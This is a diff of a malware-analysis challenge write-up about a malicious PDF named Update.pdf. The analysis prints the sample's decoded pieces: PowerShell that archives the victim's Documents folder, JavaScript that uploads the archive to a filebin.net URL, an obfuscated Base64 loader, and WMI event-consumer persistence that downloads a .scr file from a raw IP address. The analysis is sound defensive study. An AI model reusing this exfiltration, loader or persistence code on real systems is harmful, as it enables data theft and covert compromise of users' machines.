@@ -32,15 +32,12 @@ This challenge prepared by [@DXploiter](https://twitter.com/DXploiter)
 ### Findings
 
 1. Download the infected file in our isolated environment.
-2. Upload to [VirusTotal.com](http://VirusTotal.com) and check the malware validity. Trojan is flagged on the virus scan.
-
-[VirusTotal](https://www.virustotal.com/gui/file/ac3d6089d459195800931784a175b31fd65e20a937488acd95477db7dd253280/detection)
-
-1. Let's check on what is the content inside this malicious PDF file by using `strings` command
+2. Upload to [VirusTotal.com](http://VirusTotal.com) and check the malware validity. Trojan is flagged on the virus scan. [VirusTotal](https://www.virustotal.com/gui/file/ac3d6089d459195800931784a175b31fd65e20a937488acd95477db7dd253280/detection)
+3. Let's check on what is the content inside this malicious PDF file by using `strings` command
     
     `strings Update.pdf`
     
-2. After reviewing to the pdf file, I saw there is a PowerShell command which is encoded in Base64.
+4. After reviewing to the pdf file, I saw there is a PowerShell command which is encoded in Base64.
     
     ```powershell
     endobj
@@ -55,7 +52,7 @@ This challenge prepared by [@DXploiter](https://twitter.com/DXploiter)
      endobj
     ```
     
-3. Let’s decode it using CyberChef with “From Base64”. The outcome looks weird, and it looks like reversed and what I found on the next code, it open with the cmd.exe and decode with ‘best64code’ and do the ‘Reverse’ function on the ‘$base64’ variable, which means the outcome after decoding should require to reverse. 
+5. Let’s decode it using CyberChef with “From Base64”. The outcome looks weird, and it looks like reversed and what I found on the next code, it open with the cmd.exe and decode with ‘best64code’ and do the ‘Reverse’ function on the ‘$base64’ variable, which means the outcome after decoding should require to reverse. 
     
     ```powershell
     26 0 obj
@@ -73,7 +70,7 @@ This challenge prepared by [@DXploiter](https://twitter.com/DXploiter)
     endobj
     ```
     
-4. I try again with the “Reverse” option and *gotcha*! It will help you to solve question no 1- 3.
+6. I try again with the “Reverse” option and *gotcha*! It will help you to solve question no 1- 3.
     
     ```powershell
     ##Before Reverse
@@ -83,7 +80,7 @@ This challenge prepared by [@DXploiter](https://twitter.com/DXploiter)
     Compress-Archive -Path C:%Documents%* -Update -DestinationPath C:%Documents%zniwkejnnwnqw%D0csz1p
     ```
     
-5. Next, let's look into the code further. Where there is another code looks suspicious that using stream functions. Let’s try to de-obfuscate the JavaScript code using beautifier.io.
+7. Next, let's look into the code further. Where there is another code looks suspicious that using stream functions. Let’s try to de-obfuscate the JavaScript code using beautifier.io.
     
     ```powershell
     33 0 obj
@@ -96,7 +93,7 @@ This challenge prepared by [@DXploiter](https://twitter.com/DXploiter)
     
     [Online JavaScript beautifier](https://beautifier.io/)
     
-6. The outcome of the [beautifier.io](http://beautifier.io). It will help you to solve question no 4 - 6.
+8. The outcome of the [beautifier.io](http://beautifier.io). It will help you to solve question no 4 - 6.
     
     ```powershell
     var url = "https://filebin.net/0flqlz0hiz6o4l32/D0csz1p";
@@ -113,11 +110,9 @@ This challenge prepared by [@DXploiter](https://twitter.com/DXploiter)
     xhr.send(data);
     ```
     
-7. For question no 6, the obfuscation used for the JavaScript payload is stated in front of the code.
+9. For question no 6, the obfuscation used for the JavaScript payload is stated in front of the code. [](https://medium.com/ax1al/javascript-obfuscation-what-why-and-how-5a269e6b6d50)
     
-    [](https://medium.com/ax1al/javascript-obfuscation-what-why-and-how-5a269e6b6d50)
-    
-8. For question no 7, ************************************************************************which tool would have been used for creating the persistence mechanism?************************************************************************  On the **steps 5**, we saw there is a function call ‘*$best64code*’ where there is a bunch of the encoded code. I use the [tio.run](http://tio.run) to test on the output of the PowerShell code.
+10. For question no 7, ************************************************************************which tool would have been used for creating the persistence mechanism?************************************************************************  On the **steps 5**, we saw there is a function call ‘*$best64code*’ where there is a bunch of the encoded code. I use the [tio.run](http://tio.run) to test on the output of the PowerShell code.
     
     ```powershell
     $best64code = ("{5}{0}{2}{30}{12}{1}{14}{15}{6}{21}{31}{20}{10}{28}{7}{24}{11}{13}{22}{25}{17}{3}{19}{8}{4}{23}{26}{9}{16}{18}{27}{29}"-f 'mTuIXZ0xWaGRnblZXRf9lI9','atdnCNoQDiI3Yz','IXZ0xWaGBSRUFURSNEIn5Wak5WaCJXZtV3cu92QvRlclRHbpZ0XfBCSUFEUgIibvlGdwlmcjNnY1NHX092byx','EIlNmbhR3culEdldmchRFIFJVRIdFIwAD','F','=IiIcpGb2dkYaN3VIJlIc1TZtFmTuIXZtV3cu92Q05WZ2VUZulGTk5WYt12bDJSPyVWb1NnbvNEIsIiIcN2ZJV1alFlZHVmIc1TZtF','h2YhNUZslmRlNWamZ2TcBjL2EDXlNWamZ2TcRnZvN3byNWaNxFbhN2bMxVY0FGRwBXQcVSRMlkRPJFUSV0UVVCXzJXZzVFX6MkI9UGdhx','vJHXlNWamZ2TgQnZvN3byNWa','Zv1UZj5WY0NnbJ91Xg00TSZEIqACVDVET','dn5WYMl','Wb','LioGb2dkYaN3VIJlI9UWbh5EIFRVQFJ1QgIXZtV3cu92Q05WZ2','gMW','VUZulGTk5WYt12bDBCSUFEUgIibvlGdwlmcjNnY1NHX092byxFXioTRDFEUTVUTB50','5iM4Qjc','lBXYwxGbhdHXl','nclVXUsIiM21WajxFdv9mci0TZjFGcTVWbh5EduVmdFBCLiM2ZJV1alFlZHV','UfJzMul2VnASQTl','mI9UWbh5EIFRVQF','M5AiTJhEVJdFI05WZ2VkbvlGdhNWamlG','Rmbh1','GctVGVl5W','LgMWatdnCNoQDicSblR3c5N1XT9kZyVGUfFGdhREZlRHdh1','NlI9knclVXUgwiIMF1Vi0T','Nx1clxWaGBSbhJ3ZvJHUcpzQi0Da0FGUlxmYhRXdjVGeFBC','mcvZkZyVG','ZnFW','J1QgIXZ0xWaGRnblZXRf9F','vNELiAyJyN2cuIDO0IXZwFGcsxWY39CN14CN4EjL3gTMuAjNv8iOwRHdodCIlhXZuQnbwJXZ39GUcZTMlNWamZ2TcR3b','IIRVQQBiIu9Wa0BXayN2ciV3ccR3bvJHXcJiOFNUQQNVRNFkTvAyYp12d','FXioTRDFEUTVUTB50L','aM')
@@ -126,7 +121,7 @@ This challenge prepared by [@DXploiter](https://twitter.com/DXploiter)
     Write-Output $LoadCode
     ```
     
-9. Output of the code. It will help you to answer question no 7 - 11.
+11. Output of the code. It will help you to answer question no 7 - 11.
 `Query="SELECT * FROM __InstanceModificationEvent WITHIN 9000 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"`
 The suspicious script should get events from a remote location within 9000 seconds.
 `CommandLineEventConsumer CREATE Name="RHWsZbGvlj", ExecutablePath="C:\Program Files\Microsoft Office\root\Office16\Powerpnt.exe 'http://60.187.184.54/wallpaper482.scr' ",CommandLineTemplate="C:\Users\%USERPROFILE%\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\wallpaper482.scr"`
@@ -140,6 +135,4 @@ It is creating a process to run a specified executable program from a command li
     
     NOTE: Tricky part to the question no 8, where the PowerShell code is 9000 second but it should be converted to hours. 
     
-10. IP address location can use [DNSChecker](http://DNSChecker.com) to find it.
-    
-    [IP Address Lookup - Instantly Locate Your Public IP](https://dnschecker.org/ip-location.php?ip=60.187.184.54)
+12. IP address location can use [DNSChecker](http://DNSChecker.com) to find it. [IP Address Lookup - Instantly Locate Your Public IP](https://dnschecker.org/ip-location.php?ip=60.187.184.54)
